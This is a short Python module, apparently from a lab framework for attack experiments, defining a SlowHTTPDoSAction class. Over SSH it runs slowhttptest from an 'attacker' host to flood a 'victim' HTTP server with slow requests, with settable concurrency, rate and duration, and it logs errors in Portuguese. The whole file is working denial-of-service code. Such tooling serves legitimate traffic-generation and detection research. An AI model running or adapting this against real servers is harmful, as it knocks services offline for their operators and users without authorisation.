import logging
logger = logging.getLogger("[Action:DOS]")

class SlowHTTPDoSAction:
    """
    slowhttptest (GET).
    Params (YAML): port, duration_s, concurrency, rate, output_prefix
    Workload["dos_http"]: { port, duration_s, concurrency, rate, output_prefix }
    """
    def __init__(self, port=8080, duration_s=120, concurrency=500, rate=200, output_prefix="exp_dos", **kwargs):
        self.port = int(port)
        self.duration_s = int(duration_s)
        self.concurrency = int(concurrency)
        self.rate = int(rate)
        self.output_prefix = output_prefix
        self._extra = kwargs

    def run(self, attacker_ssh, victim_ip: str, workload=None, **kwargs):
        dos_cfg = (workload or {}).get("dos_http", {}) if workload else {}
        port = int(dos_cfg.get("port", self.port))
        duration_s = int(dos_cfg.get("duration_s", self.duration_s))
        concurrency = int(dos_cfg.get("concurrency", self.concurrency))
        rate = int(dos_cfg.get("rate", self.rate))
        out = dos_cfg.get("output_prefix", self.output_prefix)

        try:
            cmd = (
                "bash -lc "
                f"\"IP={victim_ip}; slowhttptest -c {concurrency} -H -i 10 -r {rate} "
                f"-t GET -u http://$IP:{port}/ -x 24 -p 3 -l {duration_s} -o {out}\""
            )
            logger.info(f"[DoS] port={port} dur={duration_s}s concurrency={concurrency} rate={rate}")
            attacker_ssh.run_command("attacker", cmd, timeout=duration_s + 180)
        except Exception as e:
            logger.error(f"[DoS] Falhou: {e}")
            raise
